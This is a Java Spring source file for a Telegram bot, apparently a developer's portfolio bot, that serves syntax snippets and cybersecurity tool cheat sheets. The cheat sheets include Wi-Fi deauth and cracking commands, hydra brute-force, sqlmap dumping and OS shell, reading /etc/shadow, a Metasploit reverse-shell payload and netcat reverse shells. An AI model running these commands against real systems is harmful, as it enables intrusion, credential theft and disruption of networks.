package com.tardis_han.RP_public.bot;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.springframework.stereotype.Service;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;

import com.tardis_han.RP_public.bot.service.MenuService;
import com.tardis_han.RP_public.bot.service.MessageService;
import com.tardis_han.RP_public.bot.service.BotService;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Service
public class CallbackHandler {

    private static final Logger logger = LoggerFactory.getLogger(CallbackHandler.class);

    private final MessageService messageService;
    private final MenuService menuService;
    private final BotService botService;
    private MyTelegramBot myTelegramBot;

    private final Map<String, Map<String, String>> examplesMap = new HashMap<>();

    public CallbackHandler(MessageService messageService, MenuService menuService, BotService botService) {
        this.botService = botService;
        this.menuService = menuService;
        this.messageService = messageService;
        initExamples();
    }

    public void setMyTelegramBot(MyTelegramBot myTelegramBot) {
        this.myTelegramBot = myTelegramBot;
    }

    private void initExamples() {
        // --- Java ---
        Map<String, String> javaExamples = new HashMap<>();
        javaExamples.put("Variables", "int a = 123;\nString s = \"Hello\";");
        javaExamples.put("Data Types", "int, double, boolean, char, String");
        javaExamples.put("Operators", "+, -, *, /, %, ++, --, ==, !=, >, <");
        javaExamples.put("Conditionals", "if(a>0){...} else {...}");
        javaExamples.put("Loops", "for(int i=0;i<10;i++){...}\nwhile(condition){...}");
        javaExamples.put("Arrays", "int[] arr = {1,2,3};");
        javaExamples.put("Lists", "List<String> list = new ArrayList<>();");
        javaExamples.put("Lambda", "(x) -> x*x");
        javaExamples.put("Functions", "public int sum(int a,int b){return a+b;}");
        javaExamples.put("Exceptions", "try{...} catch(Exception e){...}");
        examplesMap.put("java", javaExamples);

        // --- Python ---
        Map<String, String> pythonExamples = new HashMap<>();
        pythonExamples.put("Variables", "a = 123\ns = \"Hello\"");
        pythonExamples.put("Data Types", "int, float, str, bool, list, dict, tuple");
        pythonExamples.put("Operators", "+, -, *, /, %, **, ==, !=, >, <");
        pythonExamples.put("Conditionals", "if a>0:\n    ...\nelse:\n    ...");
        pythonExamples.put("Loops", "for i in range(10):\n    print(i)\nwhile condition:\n    ...");
        pythonExamples.put("Lists", "lst = [1,2,3]");
        pythonExamples.put("Dictionaries", "d = {'key':'value'}");
        pythonExamples.put("Functions", "def sum(a,b): return a+b");
        pythonExamples.put("Lambda", "square = lambda x: x*x");
        pythonExamples.put("Exceptions", "try:\n    ...\nexcept Exception as e:\n    ...");
        examplesMap.put("python", pythonExamples);

        // --- JavaScript ---
        Map<String, String> jsExamples = new HashMap<>();
        jsExamples.put("Variables", "let a = 123;\nconst s = \"Hello\";");
        jsExamples.put("Data Types", "Number, String, Boolean, Object, Array");
        jsExamples.put("Operators", "+, -, *, /, %, ++, --, ==, ===");
        jsExamples.put("Conditionals", "if(a>0){...} else {...}");
        jsExamples.put("Loops", "for(let i=0;i<10;i++){...}\nwhile(condition){...}");
        jsExamples.put("Arrays", "let arr = [1,2,3];");
        jsExamples.put("Functions", "function sum(a,b){return a+b;}");
        jsExamples.put("Arrow Functions", "const square = x => x*x;");
        jsExamples.put("Objects", "let obj = {key:'value'};");
        jsExamples.put("Exceptions", "try{...} catch(e){...}");
        examplesMap.put("javascript", jsExamples);

        // --- PHP ---
        Map<String, String> phpExamples = new HashMap<>();
        phpExamples.put("Variables", "$a = 123;\n$s = \"Hello\";");
        phpExamples.put("Data Types", "int, float, string, array, bool");
        phpExamples.put("Operators", "+, -, *, /, %, ++, --, ==, ===");
        phpExamples.put("Conditionals", "if($a>0){...} else {...}");
        phpExamples.put("Loops", "for($i=0;$i<10;$i++){...}\nwhile(condition){...}");
        phpExamples.put("Arrays", "$arr = [1,2,3];");
        phpExamples.put("Functions", "function sum($a,$b){return $a+$b;}");
        phpExamples.put("Exceptions", "try{...} catch(Exception $e){...}");
        phpExamples.put("Classes", "class MyClass{...}");
        phpExamples.put("Objects", "$obj = new MyClass();");
        phpExamples.put("Strings", "$s = \"Hello World\";");
        examplesMap.put("php", phpExamples);

        // --- Nmap ---
        Map<String, String> nmapExamples = new HashMap<>();
        nmapExamples.put("Basic Scan", "nmap 192.168.1.1");
        nmapExamples.put("SYN Scan", "nmap -sS 192.168.1.1");
        nmapExamples.put("Aggressive Scan", "nmap -A 192.168.1.1");
        nmapExamples.put("OS Detection", "nmap -O 192.168.1.1");
        nmapExamples.put("Service Version", "nmap -sV 192.168.1.1");
        nmapExamples.put("TCP Connect", "nmap -sT 192.168.1.1");
        nmapExamples.put("UDP Scan", "nmap -sU 192.168.1.1");
        nmapExamples.put("Top Ports", "nmap --top-ports 100 192.168.1.1");
        nmapExamples.put("Script Scan", "nmap -sC 192.168.1.1");
        nmapExamples.put("Traceroute", "nmap --traceroute 192.168.1.1");
        examplesMap.put("nmap", nmapExamples);

        // --- Wireshark ---
        Map<String, String> wiresharkExamples = new HashMap<>();
        wiresharkExamples.put("Capture Filter", "ip host 192.168.1.1");
        wiresharkExamples.put("Display Filter", "tcp.port==80");
        wiresharkExamples.put("Follow TCP Stream", "Follow -> TCP Stream");
        wiresharkExamples.put("Export Packets", "File -> Export Specified Packets");
        wiresharkExamples.put("Protocol Hierarchy", "Statistics -> Protocol Hierarchy");
        wiresharkExamples.put("IO Graphs", "Statistics -> IO Graphs");
        wiresharkExamples.put("Name Resolution", "View -> Name Resolution");
        wiresharkExamples.put("Coloring Rules", "View -> Coloring Rules");
        wiresharkExamples.put("Packet Details", "Click on a packet -> Details");
        wiresharkExamples.put("Packet Bytes", "Click on a packet -> Bytes");
        examplesMap.put("wireshark", wiresharkExamples);

        // --- Wi-Fi ---
        Map<String, String> wifiExamples = new HashMap<>();
        wifiExamples.put("WPA2 Setup", "Configure router WPA2 password and SSID");
        wifiExamples.put("WEP Setup", "Configure router WEP key");
        wifiExamples.put("Monitor Mode", "sudo airmon-ng start wlan0");
        wifiExamples.put("Scan Networks", "sudo airodump-ng wlan0mon");
        wifiExamples.put("Capture Handshake", "sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon");
        wifiExamples.put("Deauth Attack", "sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon");
        wifiExamples.put("Check Encryption", "iwconfig wlan0mon");
        wifiExamples.put("Disable Interface", "sudo airmon-ng stop wlan0mon");
        wifiExamples.put("Enable Interface", "sudo ifconfig wlan0 up");
        wifiExamples.put("Reconnect", "nmcli device wifi connect <SSID>");
        examplesMap.put("wifi", wifiExamples);

        // --- Aircrack-ng ---
        Map<String, String> aircrackExamples = new HashMap<>();
        aircrackExamples.put("WEP Crack", "aircrack-ng capturefile.cap -w wordlist.txt");
        aircrackExamples.put("WPA Handshake Capture", "airodump-ng wlan0mon");
        aircrackExamples.put("Dictionary Attack", "aircrack-ng -w wordlist.txt capture.cap");
        aircrackExamples.put("Brute Force", "aircrack-ng -b <BSSID> capture.cap");
        aircrackExamples.put("Replay Attack", "aireplay-ng -9 wlan0mon");
        aircrackExamples.put("Deauth Attack", "aireplay-ng --deauth 10 -a <BSSID> wlan0mon");
        aircrackExamples.put("Fake Authentication", "aireplay-ng -1 0 -a <BSSID> -h <MAC> wlan0mon");
        aircrackExamples.put("ARPPoison", "arpspoof -i wlan0mon -t <target> -r <router>");
        aircrackExamples.put("Capture All", "airodump-ng wlan0mon");
        aircrackExamples.put("Crack WPA2", "aircrack-ng -w wordlist.txt capture.cap");
        examplesMap.put("aircrack-ng", aircrackExamples);
        
        // --- НОВЫЕ ИНСТРУМЕНТЫ ---

        // --- Metasploit Framework ---
        Map<String, String> metasploitExamples = new HashMap<>();
        metasploitExamples.put("Start Console", "msfconsole");
        metasploitExamples.put("Search for Module", "search <exploit_name>");
        metasploitExamples.put("Use a Module", "use exploit/windows/smb/ms08_067_netapi");
        metasploitExamples.put("Show Options", "show options");
        metasploitExamples.put("Set Target Host", "set RHOSTS <target_ip>");
        metasploitExamples.put("Set Payload", "set payload windows/meterpreter/reverse_tcp");
        metasploitExamples.put("Set Listening Host", "set LHOST <your_ip>");
        metasploitExamples.put("Run Exploit", "exploit");
        metasploitExamples.put("Background Session", "background");
        metasploitExamples.put("List Sessions", "sessions -l");
        examplesMap.put("metasploit", metasploitExamples);

        // --- Burp Suite ---
        Map<String, String> burpExamples = new HashMap<>();
        burpExamples.put("Proxy Interception", "Proxy -> Intercept -> Intercept is on/off");
        burpExamples.put("Send to Repeater", "Right-click on request -> Send to Repeater");
        burpExamples.put("Send to Intruder", "Right-click on request -> Send to Intruder");
        burpExamples.put("Decoder", "Use Decoder tab to encode/decode data");
        burpExamples.put("Scanner", "Right-click on target -> Actively scan this host");
        burpExamples.put("Target Scope", "Target -> Scope -> Add to scope");
        burpExamples.put("Spidering", "Right-click on target -> Spider this host");
        burpExamples.put("Search", "Target -> Search for keywords or regex");
        examplesMap.put("burp_suite", burpExamples);

        // --- sqlmap ---
        Map<String, String> sqlmapExamples = new HashMap<>();
        sqlmapExamples.put("Basic Injection Test", "sqlmap -u \"http://test.com/page.php?id=1\"");
        sqlmapExamples.put("List Databases", "sqlmap -u \"URL\" --dbs");
        sqlmapExamples.put("List Tables in DB", "sqlmap -u \"URL\" -D <database_name> --tables");
        sqlmapExamples.put("Dump Table Data", "sqlmap -u \"URL\" -D <db> -T <table> --dump");
        sqlmapExamples.put("Crawl a Site", "sqlmap -u \"URL\" --crawl=2");
        sqlmapExamples.put("Use POST data", "sqlmap -u \"URL\" --data=\"id=1&user=test\"");
        sqlmapExamples.put("OS Shell", "sqlmap -u \"URL\" --os-shell");
        sqlmapExamples.put("Increase Risk/Level", "sqlmap -u \"URL\" --level=5 --risk=3");
        examplesMap.put("sqlmap", sqlmapExamples);

        // --- John the Ripper ---
        Map<String, String> johnExamples = new HashMap<>();
        johnExamples.put("Basic Crack", "john password-hashes.txt");
        johnExamples.put("Use Wordlist", "john --wordlist=wordlist.txt password-hashes.txt");
        johnExamples.put("Specify Format", "john --format=raw-md5 --wordlist=wl.txt hashes.txt");
        johnExamples.put("Show Cracked Passwords", "john --show password-hashes.txt");
        johnExamples.put("Incremental Mode", "john --incremental password-hashes.txt");
        johnExamples.put("Unshadow", "unshadow /etc/passwd /etc/shadow > pass.txt");
        examplesMap.put("john_the_ripper", johnExamples);

        // --- Hashcat ---
        Map<String, String> hashcatExamples = new HashMap<>();
        hashcatExamples.put("Dictionary Attack (MD5)", "hashcat -m 0 -a 0 hashes.txt wordlist.txt");
        hashcatExamples.put("Brute-Force Attack (WPA2)", "hashcat -m 2500 -a 3 capture.hccapx ?d?d?d?d?d?d?d?d");
        hashcatExamples.put("Show Hash Types", "hashcat --help");
        hashcatExamples.put("Run Benchmark", "hashcat -b");
        hashcatExamples.put("Combination Attack", "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt");
        hashcatExamples.put("Use Rules", "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule");
        examplesMap.put("hashcat", hashcatExamples);

        // --- Hydra ---
        Map<String, String> hydraExamples = new HashMap<>();
        hydraExamples.put("FTP Brute-force", "hydra -l user -P passlist.txt ftp://192.168.1.1");
        hydraExamples.put("SSH Brute-force", "hydra -L userlist.txt -p password ssh://192.168.1.1");
        hydraExamples.put("HTTP POST Form", "hydra -l admin -P pass.txt 10.0.0.1 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Login failed\"");
        hydraExamples.put("Verbose Mode", "hydra -V -l user -P passlist.txt ftp://192.168.1.1");
        hydraExamples.put("Use 4 Threads", "hydra -t 4 -l user -P passlist.txt ftp://192.168.1.1");
        examplesMap.put("hydra", hydraExamples);

        // --- Gobuster ---
        Map<String, String> gobusterExamples = new HashMap<>();
        gobusterExamples.put("Directory Brute-force", "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt");
        gobusterExamples.put("Specify Extensions", "gobuster dir -u http://example.com -w list.txt -x php,html,txt");
        gobusterExamples.put("DNS Subdomain Brute-force", "gobuster dns -d example.com -w subdomains.txt");
        gobusterExamples.put("VHost Brute-force", "gobuster vhost -u http://example.com -w vhosts.txt");
        gobusterExamples.put("Set Threads", "gobuster dir -u http://example.com -w list.txt -t 50");
        examplesMap.put("gobuster", gobusterExamples);

        // --- Netcat ---
        Map<String, String> netcatExamples = new HashMap<>();
        netcatExamples.put("Listen on a Port", "nc -lvnp 4444");
        netcatExamples.put("Connect to a Port", "nc 192.168.1.1 4444");
        netcatExamples.put("Banner Grabbing", "nc -v 192.168.1.1 80");
        netcatExamples.put("Simple File Transfer (Receiver)", "nc -lvnp 4444 > received_file");
        netcatExamples.put("Simple File Transfer (Sender)", "nc 192.168.1.1 4444 < file_to_send");
        netcatExamples.put("Reverse Shell (Listener)", "nc -lvnp 4444 -e /bin/bash");
        netcatExamples.put("Reverse Shell (Target)", "nc 192.168.1.10 4444 -e /bin/bash");
        examplesMap.put("netcat", netcatExamples);

        // --- OWASP ZAP ---
        Map<String, String> zapExamples = new HashMap<>();
        zapExamples.put("Quick Start Scan", "In UI: Quick Start -> URL to attack -> Attack");
        zapExamples.put("Manual Explore", "Configure browser proxy to ZAP (localhost:8080) and explore the site.");
        zapExamples.put("Active Scan", "Right-click a site in the Sites tree -> Attack -> Active Scan");
        zapExamples.put("Spider", "Right-click a site -> Attack -> Spider");
        zapExamples.put("AJAX Spider", "Use after standard spider for JS-heavy sites.");
        zapExamples.put("Fuzzing", "Right-click a request -> Fuzz. Select payload locations and add payloads.");
        examplesMap.put("owasp_zap", zapExamples);

        // --- Nikto ---
        Map<String, String> niktoExamples = new HashMap<>();
        niktoExamples.put("Basic Scan", "nikto -h http://example.com");
        niktoExamples.put("Scan a specific port", "nikto -h http://example.com -p 8080");
        niktoExamples.put("Output to File", "nikto -h http://example.com -o report.html -F html");
        niktoExamples.put("Update Plugins", "nikto -update");
        niktoExamples.put("Use Proxy", "nikto -h http://example.com -useproxy http://localhost:8080");
        examplesMap.put("nikto", niktoExamples);

        // --- Maltego ---
        Map<String, String> maltegoExamples = new HashMap<>();
        maltegoExamples.put("Create a Graph", "File -> New Graph");
        maltegoExamples.put("Add Entity", "Drag an entity (e.g., Domain) from the palette to the graph.");
        maltegoExamples.put("Run a Transform", "Right-click an entity -> Run Transform -> Choose transform (e.g., To DNS Name)");
        maltegoExamples.put("OSINT on Person", "Use Person entity, run transforms for email, social media.");
        maltegoExamples.put("Infrastructure Mapping", "Start with a Domain, find DNS, IPs, Netblocks.");
        examplesMap.put("maltego", maltegoExamples);
        
        // --- The Harvester ---
        Map<String, String> harvesterExamples = new HashMap<>();
        harvesterExamples.put("Basic Enumeration", "theharvester -d example.com -b google");
        harvesterExamples.put("Use All Sources", "theharvester -d example.com -b all");
        harvesterExamples.put("Limit Results", "theharvester -d example.com -b google -l 200");
        harvesterExamples.put("Save to HTML file", "theharvester -d example.com -b all -f report.html");
        harvesterExamples.put("DNS Brute Force", "theharvester -d example.com -b baidu -c");
        examplesMap.put("the_harvester", harvesterExamples);
    }

    public void processCallback(Update update) {
        String callbackData = update.getCallbackQuery().getData();
        long chatId = update.getCallbackQuery().getMessage().getChatId();

        logger.info("📌 processCallback '{}'", callbackData);

        switch (callbackData) {
            case "about_me" -> sendMessageWithBack(chatId,
                    "I am a developer with 5 years of experience, specializing in Java, Python, JavaScript. In my spare time I do web development and cybersecurity.",
                    "main_menu");

            case "contact" -> sendMessageWithBack(chatId,
                    "You can contact me on Telegram: @Lex_TARDIS or email: ohanchak@gmail.com",
                    "main_menu");

            case "web_and_security" -> sendWebAndSecurityMenu(chatId);
            case "web" -> sendSubMenu(chatId, "Select a language:", "java", "python", "javascript", "php");
            // ОБНОВЛЕНО: Добавлены новые инструменты в меню
            case "security" -> sendSubMenu(chatId, "Choose a topic:", "wifi", "wireshark", "aircrack-ng", "nmap", "metasploit", "burp_suite", "sqlmap", "john_the_ripper", "hashcat", "hydra", "gobuster", "netcat", "owasp_zap", "nikto", "maltego", "the_harvester");
            case "main_menu" -> sendStartMenu(chatId);

            default -> {
                // Исправлено: проверяем наличие "_detail_" в любой части строки
                if (callbackData.contains("_detail_")) {
                    String[] parts = callbackData.split("_detail_");
                    if (parts.length == 2) {
                        String topic = parts[0];
                        try {
                            int index = Integer.parseInt(parts[1]);
                            sendExampleDetail(chatId, topic, index);
                        } catch (NumberFormatException e) {
                            messageService.sendMessage(chatId, "Invalid example index.");
                            logger.error("Invalid example index in callback: {}", callbackData, e);
                        }
                    } else {
                        messageService.sendMessage(chatId, "Invalid callback format.");
                        logger.warn("Invalid callback format: {}", callbackData);
                    }
                } else {
                    if (examplesMap.containsKey(callbackData)) {
                        sendTopicMenu(chatId, callbackData);
                    } else {
                        messageService.sendMessage(chatId, "Unknown command: " + callbackData);
                        logger.warn("Unknown callback command: {}", callbackData);
                    }
                }
            }
        }
    }

    // --- Helpers ---
    private String getTopicDescription(String topic) {
        return switch (topic) {
            case "java" -> "Java is a powerful object-oriented programming language widely used for web development and enterprise systems.";
            case "python" -> "Python is a simple and powerful programming language used for web development, data science, and automation.";
            case "javascript" -> "JavaScript is a frontend and backend programming language that allows you to create dynamic web applications.";
            case "php" -> "PHP is a server-side scripting language widely used for web development.";
            case "nmap" -> "Nmap is a network scanner that helps you identify open ports and services.";
            case "wireshark" -> "Wireshark is a network traffic analyzer used for security diagnostics.";
            case "wifi" -> "Wi-Fi security topics including WPA2/WEP setup and monitoring.";
            case "aircrack-ng" -> "Aircrack-ng is a suite of tools for Wi-Fi security testing.";
            
            // --- НОВЫЕ ОПИСАНИЯ ---
            case "metasploit" -> "Metasploit Framework is a powerful platform for developing, testing, and executing exploits.";
            case "burp_suite" -> "Burp Suite is an integrated platform for performing security testing of web applications.";
            case "sqlmap" -> "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.";
            case "john_the_ripper" -> "John the Ripper is a fast password cracker, available for many operating systems.";
            case "hashcat" -> "Hashcat is the world's fastest and most advanced password recovery utility.";
            case "hydra" -> "Hydra is a parallelized login cracker which supports numerous protocols to attack.";
            case "gobuster" -> "Gobuster is a tool used to brute-force URIs (directories and files), DNS subdomains and Virtual Host names.";
            case "netcat" -> "Netcat is a versatile networking utility for reading from and writing to network connections using TCP or UDP.";
            case "owasp_zap" -> "OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner.";
            case "nikto" -> "Nikto is a web server scanner which performs comprehensive tests against web servers for multiple items.";
            case "maltego" -> "Maltego is a tool for open-source intelligence (OSINT) and graphical link analysis.";
            case "the_harvester" -> "The Harvester is a tool for gathering open source information (emails, subdomains, hosts) from different public sources.";

            default -> "";
        };
    }

    private void sendTopicMenu(long chatId, String topic) {
        String description = getTopicDescription(topic);

        SendMessage message = new SendMessage();
        message.setChatId(String.valueOf(chatId));
        message.setText(description);

        List<List<InlineKeyboardButton>> buttons = new ArrayList<>();
        Map<String, String> topicExamples = examplesMap.getOrDefault(topic, Collections.emptyMap());
        int index = 0;
        for (String exTitle : topicExamples.keySet()) {
            buttons.add(List.of(menuService.createButton(exTitle, topic + "_detail_" + index)));
            index++;
        }

        // 🔙 Back всегда на выбор Web или Security
        String backCallback = (topic.equals("java") || topic.equals("python") || topic.equals("javascript") || topic.equals("php")) ? "web" : "security";

        buttons.add(List.of(
                menuService.createButton("🔙 Back", backCallback),
                menuService.createButton("🏠 Main Menu", "main_menu")
        ));

        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        markup.setKeyboard(buttons);
        message.setReplyMarkup(markup);

        myTelegramBot.sendMessage(message);
    }

    private void sendExampleDetail(long chatId, String topic, int index) {
        Map<String, String> topicExamples = examplesMap.getOrDefault(topic, Collections.emptyMap());
        if (index < 0 || index >= topicExamples.size()) {
            messageService.sendMessage(chatId, "Example not found.");
            logger.warn("Example index out of bounds: topic={}, index={}", topic, index);
            return;
        }

        String title = new ArrayList<>(topicExamples.keySet()).get(index);
        String code = new ArrayList<>(topicExamples.values()).get(index);

        SendMessage message = new SendMessage();
        message.setChatId(String.valueOf(chatId));
        // Используем форматирование Markdown для кода
        message.setText("*" + title + "*\n```\n" + code + "\n```");
        message.setParseMode("Markdown");

        List<List<InlineKeyboardButton>> buttons = List.of(
                List.of(
                        // 🔙 Back возвращаем к теме
                        menuService.createButton("🔙 Back", topic),
                        menuService.createButton("🏠 Main Menu", "main_menu")
                )
        );
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        markup.setKeyboard(buttons);
        message.setReplyMarkup(markup);

        myTelegramBot.sendMessage(message);
    }

    private void sendStartMenu(long chatId) {
        SendMessage message = new SendMessage();
        message.setChatId(String.valueOf(chatId));
        message.setText("Welcome! Select an option:");

        message.setReplyMarkup(new InlineKeyboardMarkup(Arrays.asList(
                Arrays.asList(menuService.createUrlButton("To the website", "https://hanchakweb.web.app")),
                Arrays.asList(menuService.createButton("About me", "about_me")),
                Arrays.asList(menuService.createButton("Contact TG", "contact")),
                Arrays.asList(menuService.createButton("Web development and cybersecurity", "web_and_security"))
        )));

        myTelegramBot.sendMessage(message);
    }

    private void sendWebAndSecurityMenu(long chatId) {
        SendMessage message = new SendMessage();
        message.setChatId(String.valueOf(chatId));
        message.setText("Choose a section:");

        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        markup.setKeyboard(Arrays.asList(
                Arrays.asList(menuService.createButton("Web development", "web")),
                Arrays.asList(menuService.createButton("Cybersecurity", "security")),
                Arrays.asList(menuService.createButton("🏠 Main Menu", "main_menu"))
        ));

        message.setReplyMarkup(markup);
        myTelegramBot.sendMessage(message);
    }

    private void sendSubMenu(long chatId, String text, String... options) {
        if (myTelegramBot == null) {
            logger.error("❌ Error: myTelegramBot in CallbackHandler == null!");
            return;
        }

        SendMessage message = new SendMessage();
        message.setChatId(String.valueOf(chatId));
        message.setText(text);

        List<List<InlineKeyboardButton>> buttons = new ArrayList<>();
        // Создаем кнопки в два столбца для лучшей читаемости
        List<InlineKeyboardButton> row = new ArrayList<>();
        for (String option : options) {
            row.add(menuService.createButton(option.replace("_", " "), option));
            if (row.size() == 2) {
                buttons.add(row);
                row = new ArrayList<>();
            }
        }
        if (!row.isEmpty()) {
            buttons.add(row);
        }

        // 🔙 Back всегда на выбор Web или Security
        buttons.add(List.of(menuService.createButton("🔙 Back", "web_and_security")));

        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        markup.setKeyboard(buttons);

        message.setReplyMarkup(markup);
        myTelegramBot.sendMessage(message);
    }

    private void sendMessageWithBack(long chatId, String text, String backCallback) {
        if (myTelegramBot == null) {
            logger.error("❌ Error: myTelegramBot in CallbackHandler == null!");
            return;
        }

        SendMessage message = new SendMessage();
        message.setChatId(String.valueOf(chatId));
        message.setText(text);
        message.setReplyMarkup(new InlineKeyboardMarkup(List.of(
                List.of(menuService.createButton("🔙 Back", backCallback))
        )));

        myTelegramBot.sendMessage(message);
    }
}
